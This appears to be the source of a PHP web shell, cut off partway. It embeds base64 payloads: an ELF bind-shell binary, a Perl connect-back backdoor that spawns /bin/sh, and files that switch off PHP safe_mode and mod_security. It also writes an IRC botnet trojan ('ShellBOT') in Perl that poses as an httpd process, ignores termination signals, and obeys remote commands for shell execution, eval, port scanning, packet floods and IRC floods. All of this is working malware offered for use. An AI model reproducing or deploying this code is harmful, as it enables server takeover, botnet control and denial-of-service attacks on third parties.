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2NydG4uUwAxLmMAX0RZTkFNSUMAX19maW5pX2FycmF5X2VuZABfX2ZpbmlfYXJyYXlfc3RhcnQAX19pbml0X2FycmF5X2VuZABfR0xPQkFMX09GRlNFVF9UQUJMRV8AX19pbml0X2FycmF5X3N0YXJ0AGV4ZWNsQEBHTElCQ18yLjAAY2xvc2VAQEdMSUJDXzIuMABfZnBfaHcAcGVycm9yQEBHTElCQ18yLjAAZm9ya0BAR0xJQkNfMi4wAF9fZHNvX2hhbmRsZQBfX2xpYmNfY3N1X2ZpbmkAYWNjZXB0QEBHTElCQ18yLjAAX2luaXQAbGlzdGVuQEBHTElCQ18yLjAAc2V0c29ja29wdEBAR0xJQkNfMi4wAF9zdGFydABfX2xpYmNfY3N1X2luaXQAX19ic3Nfc3RhcnQAbWFpbgBfX2xpYmNfc3RhcnRfbWFpbkBAR0xJQkNfMi4wAGR1cDJAQEdMSUJDXzIuMABkYXRhX3N0YXJ0AGJpbmRAQEdMSUJDXzIuMABfZmluaQBleGl0QEBHTElCQ18yLjAAYXRvaUBAR0xJQkNfMi4wAF9lZGF0YQBfX2k2ODYuZ2V0X3BjX3RodW5rLmJ4AF9lbmQAc2VuZEBAR0xJQkNfMi4wAGh0b25zQEBHTElCQ18yLjAAX0lPX3N0ZGluX3VzZWQAX19kYXRhX3N0YXJ0AHNvY2tldEBAR0xJQkNfMi4wAF9Kdl9SZWdpc3RlckNsYXNzZXMAX19nbW9uX3N0YXJ0X18A";
$back_connects="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KaWYgKCEkQVJHVlswXSkgew0KICBwcmludGYgIlVzYWdlOiAkMCBbSG9zdF0gPFBvcnQ+XG4iOw0KICBleGl0KDEpOw0KfQ0KcHJpbnQgIlsqXSBEdW1waW5nIEFyZ3VtZW50c1xuIjsNCiRob3N0ID0gJEFSR1ZbMF07DQokcG9ydCA9IDgwOw0KaWYgKCRBUkdWWzFdKSB7DQogICRwb3J0ID0gJEFSR1ZbMV07DQp9DQpwcmludCAiWypdIENvbm5lY3RpbmcuLi5cbiI7DQokcHJvdG8gPSBnZXRwcm90b2J5bmFtZSgndGNwJykgfHwgZGllKCJVbmtub3duIFByb3RvY29sXG4iKTsNCnNvY2tldChTRVJWRVIsIFBGX0lORVQsIFNPQ0tfU1RSRUFNLCAkcHJvdG8pIHx8IGRpZSAoIlNvY2tldCBFcnJvclxuIik7DQpteSAkdGFyZ2V0ID0gaW5ldF9hdG9uKCRob3N0KTsNCmlmICghY29ubmVjdChTRVJWRVIsIHBhY2sgIlNuQTR4OCIsIDIsICRwb3J0LCAkdGFyZ2V0KSkgew0KICBkaWUoIlVuYWJsZSB0byBDb25uZWN0XG4iKTsNCn0NCnByaW50ICJbKl0gU3Bhd25pbmcgU2hlbGxcbiI7DQppZiAoIWZvcmsoICkpIHsNCiAgb3BlbihTVERJTiwiPiZTRVJWRVIiKTsNCiAgb3BlbihTVERPVVQsIj4mU0VSVkVSIik7DQogIG9wZW4oU1RERVJSLCI+JlNFUlZFUiIpOw0KICBwcmludCAiLS09PSBDb25uZWN0QmFjayBCYWNrZG9vciB2cyAxLjAgYnkgU25JcEVyX1NBIHNuaXBlci1zYS5jb20gPT0tLSAgXG5cbiI7IA0Kc3lzdGVtKCJ1bnNldCBISVNURklMRTsgdW5zZXQgU0FWRUhJU1QgO2VjaG8gLS09PVN5c3RlbWluZm89PS0tIDsgdW5hbWUgLWE7ZWNobzsNCmVjaG8gLS09PVVzZXJpbmZvPT0tLSA7IGlkO2VjaG87ZWNobyAtLT09RGlyZWN0b3J5PT0tLSA7IHB3ZDtlY2hvOyBlY2hvIC0tPT1TaGVsbD09LS0gIik7IA0KICBleGVjIHsnL2Jpbi9zaCd9ICctYmFzaCcgLiAiXDAiIHggNDsNCiAgZXhpdCgwKTsNCn0=";
$php_ini1="c2FmZV9tb2RlICAgICAgICAgICAgICAgPSAgICAgICBPZmY=";
$htacces="PElmTW9kdWxlIG1vZF9zZWN1cml0eS5jPg0KICAgIFNlY0ZpbHRlckVuZ2luZSBPZmYNCiAgICBTZWNGaWx0ZXJTY2FuUE9TVCBPZmYNCjwvSWZNb2R1bGU+";
$sni_res="PD8NCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsiZmlsZSJdKTsNCmluaV9yZXN0b3JlKCJzYWZlX21vZGUiKTsNCmluaV9yZXN0b3JlKCJvcGVuX2Jhc2VkaXIiKTsNCmVjaG8gaW5pX2dldCgic2FmZV9tb2RlIik7DQplY2hvIGluaV9nZXQoIm9wZW5fYmFzZWRpciIpOw0KaW5jbHVkZSgkX0dFVFsic3MiXSk7DQo/Pg==";

if(!empty($_POST['ircadmin']) AND !empty($_POST['ircserver']) AND !empty($_POST['ircchanal']) AND !empty($_POST['ircname']))
{
$ircadmin=$_POST['ircadmin'];
$ircserver=$_POST['ircserver'];
$ircchan=$_POST['ircchanal'];
$irclabel=$_POST['ircname'];
echo "<title>OverclockiX Shell-Connector || Connecting to $ircserver<title>";
echo "<body bgcolor=\"black\" text=\"green\">";
echo "Now Connecting to <b><font color=\"red\">$ircserver</font></b> in <b><font color=\"yellow\">$ircchan</font></b> Andministrators: <b><font color=\"yellow\">$ircadmin</font></b> Botname is <b><font color=\"yellow\">$irclabel</font></b>";
echo "<p>Dont Forget to Delete Loader.pl in /tmp</p>";
#######################################################
######################IRC Trojan##########################
$file="
################ CONFIGURACAO #################################################################
my \$processo = '/usr/local/apache/bin/httpd -DSSL'; # Nome do processo que vai aparece no ps #
#----------------------------------------------################################################
my \$linas_max='48'; # Evita o flood :) depois de X linhas #
#----------------------------------------------################################################
my \$sleep='4'; # ele dorme X segundos #
##################### IRC #####################################################################
my @adms=(\"$ircadmin\"); # Nick do administrador #
#----------------------------------------------################################################
my @canais=(\"$ircchan\"); # Caso haja senha (\"#canal :senha\") #
#----------------------------------------------################################################
my \$nick='$irclabel'; # Nick do bot. Caso esteja em uso vai aparecer #
                                               # aparecer com numero radonamico no final #
#----------------------------------------------################################################
my \$ircname = 'Linux'; # User ID #
#----------------------------------------------################################################
chop (my \$realname = `uname -a`); # Full Name #
#----------------------------------------------################################################
\$servidor='$ircserver' unless \$servidor; # Servidor de irc que vai ser usado #
                                               # caso n„o seja especificado no argumento #
#----------------------------------------------################################################
my \$porta='6667'; # Porta do servidor de irc #
################ ACESSO A SHELL ###############################################################
my \$secv = 1; # 1/0 pra habilita/desabilita acesso a shell #
###############################################################################################
my \$VERSAO = '0.2';
\$SIG{'INT'} = 'IGNORE';
\$SIG{'HUP'} = 'IGNORE';
\$SIG{'TERM'} = 'IGNORE';
\$SIG{'CHLD'} = 'IGNORE';
\$SIG{'PS'} = 'IGNORE';
\$SIG{'STOP'} = 'IGNORE';
use IO::Socket;
use Socket;
use IO::Select;
chdir(\"/\");
\$servidor=\"\$ARGV[0]\" if \$ARGV[0];
$0=\"\$processo\".\"\0\"x16;;
my \$pid=fork;
exit if \$pid;
die \"Problema com o fork: $!\" unless defined(\$pid);
my \$dcc_sel = new IO::Select->new();
#############################
# B0tchZ na veia ehehe :P #
#############################

\$sel_cliente = IO::Select->new();
sub sendraw {
  if ($#_ == '1') {
    my \$socket = \$_[0];
    print \$socket \"\$_[1]\\n\";
  } else {
      print \$IRC_cur_socket \"\$_[0]\\n\";
  }
}
#################################
sub conectar {
   my \$meunick = \$_[0];
   my \$servidor_con = \$_[1];
   my \$porta_con = \$_[2];

   my \$IRC_socket = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"\$servidor_con\", PeerPort=>\$porta_con) or return(1);
   if (defined(\$IRC_socket)) {
     \$IRC_cur_socket = \$IRC_socket;

     \$IRC_socket->autoflush(1);
     \$sel_cliente->add(\$IRC_socket);

     \$irc_servers{\$IRC_cur_socket}{'host'} = \"\$servidor_con\";
     \$irc_servers{\$IRC_cur_socket}{'porta'} = \"\$porta_con\";
     \$irc_servers{\$IRC_cur_socket}{'nick'} = \$meunick;
     \$irc_servers{\$IRC_cur_socket}{'meuip'} = \$IRC_socket->sockhost;
     nick(\"\$meunick\");
     sendraw(\"USER \$ircname \".\$IRC_socket->sockhost.\" \$servidor_con :\$realname\");
     sleep 1;
   }
} #####################

my \$line_temp;
while( 1 ) {
   while (!(keys(%irc_servers))) { conectar(\"\$nick\", \"\$servidor\", \"\$porta\"); }
   delete(\$irc_servers{''}) if (defined(\$irc_servers{''}));
   &DCC::connections;
   my @ready = \$sel_cliente->can_read(0);
   next unless(@ready);
   foreach \$fh (@ready) {
     \$IRC_cur_socket = \$fh;
     \$meunick = \$irc_servers{\$IRC_cur_socket}{'nick'};
     \$nread = sysread(\$fh, \$msg, 4096);
     if (\$nread == 0) {
        \$sel_cliente->remove(\$fh);
        \$fh->close;
        delete(\$irc_servers{\$fh});
     }
     @lines = split (/\\n/, \$msg);

     for(my \$c=0; \$c<= $#lines; \$c++) {
       \$line = \$lines[\$c];
       \$line=\$line_temp.\$line if (\$line_temp);
       \$line_temp='';
       \$line =~ s/\\r$//;
       unless (\$c == $#lines) {
         parse(\"\$line\");
       } else {
           if ($#lines == 0) {
             parse(\"\$line\");
           } elsif (\$lines[\$c] =~ /\\r$/) {
               parse(\"\$line\");
           } elsif (\$line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
               parse(\"\$line\");
           } else {
               \$line_temp = \$line;
           }
       }
      }
   }
}

#########################


sub parse {
   my \$servarg = shift;
   if (\$servarg =~ /^PING \:(.*)/) {
     sendraw(\"PONG :$1\");
   } elsif (\$servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
       my \$pn=$1; my \$onde = $4; my \$args = $5;
       if (\$args =~ /^\\001VERSION\\001$/) {
         notice(\"\$pn\", \"\\001VERSION ShellBOT-\$VERSAO por 0ldW0lf\\001\");
       }
       if (grep {\$_ =~ /^\Q\$pn\E$/i } @adms) {
         if (\$onde eq \"\$meunick\"){
           shell(\"\$pn\", \"\$args\");
         }
         if (\$args =~ /^(\Q\$meunick\E|\!atrix)\s+(.*)/ ) {
            my \$natrix = $1;
            my \$arg = $2;
            if (\$arg =~ /^\!(.*)/) {
              ircase(\"\$pn\",\"\$onde\",\"\$1\") unless (\$natrix eq \"!atrix\" and \$arg =~ /^\!nick/);
            } elsif (\$arg =~ /^\@(.*)/) {
                \$ondep = \$onde;
                \$ondep = \$pn if \$onde eq \$meunick;
                bfunc(\"\$ondep\",\"$1\");
            } else {
                shell(\"\$onde\", \"\$arg\");
            }
         }
       }
   } elsif (\$servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
       if (lc($1) eq lc(\$meunick)) {
         \$meunick=$4;
         \$irc_servers{\$IRC_cur_socket}{'nick'} = \$meunick;
       }
   } elsif (\$servarg =~ m/^\:(.+?)\s+433/i) {
       nick(\"\$meunick\".int rand(9999));
   } elsif (\$servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
       \$meunick = $2;
       \$irc_servers{\$IRC_cur_socket}{'nick'} = \$meunick;
       \$irc_servers{\$IRC_cur_socket}{'nome'} = \"$1\";
       foreach my \$canal (@canais) {
         sendraw(\"JOIN \$canal\");
       }
   }
}
##########################

sub bfunc {
  my \$printl = \$_[0];
  my \$funcarg = \$_[1];
  if (my \$pid = fork) {
     waitpid(\$pid, 0);
  } else {
      if (fork) {
         exit;
       } else {
           if (\$funcarg =~ /^portscan (.*)/) {
             my \$hostip=\"$1\";
             my @portas=(\"21\",\"22\",\"23\",\"25\",\"53\",\"80\",\"110\",\"143\");
             my (@aberta, %porta_banner);
             foreach my \$porta (@portas) {
                my \$scansock = IO::Socket::INET->new(PeerAddr => \$hostip, PeerPort => \$porta, Proto => 'tcp', Timeout => 4);
                if (\$scansock) {
                   push (@aberta, \$porta);
                   \$scansock->close;
                }
             }

             if (@aberta) {
               sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :portas abertas: @aberta\");
             } else {
                 sendraw(\$IRC_cur_socket,\"PRIVMSG \$printl :Nenhuma porta aberta foi encontrada\");
             }
           }
           if (\$funcarg =~ /^pacota\s+(.*)\s+(\d+)\s+(\d+)/) {
             my (\$dtime, %pacotes) = attacker(\"$1\", \"$2\", \"$3\");
             \$dtime = 1 if \$dtime == 0;
             my %bytes;
             \$bytes{igmp} = $2 * \$pacotes{igmp};
             \$bytes{icmp} = $2 * \$pacotes{icmp};
             \$bytes{o} = $2 * \$pacotes{o};
             \$bytes{udp} = $2 * \$pacotes{udp};
             \$bytes{tcp} = $2 * \$pacotes{tcp};

             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\\002 - Status GERAL -\\002\");
             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\\002Tempo\\002: \$dtime\".\"s\");
             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\\002Total pacotes\\002: \".(\$pacotes{udp} + \$pacotes{igmp} + \$pacotes{icmp} + \$pacotes{o}));
             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\\002Total bytes\\002: \".(\$bytes{icmp} + \$bytes {igmp} + \$bytes{udp} + \$bytes{o}));
             sendraw(\$IRC_cur_socket, \"PRIVMSG \$printl :\\002MÈdia de envio\\002: \".int(((\$bytes{icmp}+\$bytes{igmp}+\$bytes{udp} + \$bytes{o})/1024)/\$dtime).\" kbps\");

           }
           exit;
       }
  }
}
##########################


sub ircase {
  my (\$kem, \$printl, \$case) = @_;


  if (\$case =~ /^join (.*)/) {
     j(\"$1\");
   }
   if (\$case =~ /^part (.*)/) {
      p(\"$1\");
   }
   if (\$case =~ /^rejoin\s+(.*)/) {
      my \$chan = $1;
      if (\$chan =~ /^(\d+) (.*)/) {
        for (my \$ca = 1; \$ca <= $1; \$ca++ ) {
          p(\"$2\");
          j(\"$2\");
        }
      } else {
          p(\"\$chan\");
          j(\"\$chan\");
      }
   }
   if (\$case =~ /^op/) {
      op(\"\$printl\", \"\$kem\") if \$case eq \"op\";
      my \$oarg = substr(\$case, 3);
      op(\"$1\", \"$2\") if (\$oarg =~ /(\S+)\s+(\S+)/);
   }
   if (\$case =~ /^deop/) {
      deop(\"\$printl\", \"\$kem\") if \$case eq \"deop\";
      my \$oarg = substr(\$case, 5);
      deop(\"$1\", \"$2\") if (\$oarg =~ /(\S+)\s+(\S+)/);
   }
   if (\$case =~ /^voice/) {
      voice(\"\$printl\", \"\$kem\") if \$case eq \"voice\";
      \$oarg = substr(\$case, 6);
      voice(\"$1\", \"$2\") if (\$oarg =~ /(\S+)\s+(\S+)/);
   }
   if (\$case =~ /^devoice/) {
      devoice(\"\$printl\", \"\$kem\") if \$case eq \"devoice\";
      \$oarg = substr(\$case, 8);
      devoice(\"$1\", \"$2\") if (\$oarg =~ /(\S+)\s+(\S+)/);
   }
   if (\$case =~ /^msg\s+(\S+) (.*)/) {
      msg(\"$1\", \"$2\");
   }
   if (\$case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
      for (my \$cf = 1; \$cf <= $1; \$cf++) {
        msg(\"$2\", \"$3\");
      }
   }
   if (\$case =~ /^ctcp\s+(\S+) (.*)/) {
      ctcp(\"$1\", \"$2\");
   }
   if (\$case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
      for (my \$cf = 1; \$cf <= $1; \$cf++) {
        ctcp(\"$2\", \"$3\");
      }
   }
   if (\$case =~ /^invite\s+(\S+) (.*)/) {
      invite(\"$1\", \"$2\");
   }
   if (\$case =~ /^nick (.*)/) {
      nick(\"$1\");
   }
   if (\$case =~ /^conecta\s+(\S+)\s+(\S+)/) {
       conectar(\"$2\", \"$1\", 6667);
   }
   if (\$case =~ /^send\s+(\S+)\s+(\S+)/) {
      DCC::SEND(\"$1\", \"$2\");
   }
   if (\$case =~ /^raw (.*)/) {
      sendraw(\"$1\");
   }
   if (\$case =~ /^eval (.*)/) {
     eval \"$1\";
   }
}
##########################

sub shell {
  return unless \$secv;
  my \$printl=\$_[0];
  my \$comando=\$_[1];
  if (\$comando =~ /cd (.*)/) {
    chdir(\"$1\") || msg(\"\$printl\", \"Dossier Makayench :D \");
    return;
  }
